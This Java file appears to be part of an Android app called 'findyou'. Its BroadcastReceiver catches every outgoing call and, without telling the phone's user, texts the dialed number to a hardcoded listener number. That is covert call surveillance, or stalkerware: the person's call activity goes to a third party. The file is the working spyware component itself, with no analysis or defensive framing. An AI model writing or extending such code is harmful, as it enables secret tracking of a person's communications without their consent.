package com.example.hp.findyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class toPhoneReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        String tophoneNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        String msg = "he call to "+tophoneNum;
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(MyConstants.listenerNumber, null, msg, null, null);
    }
}
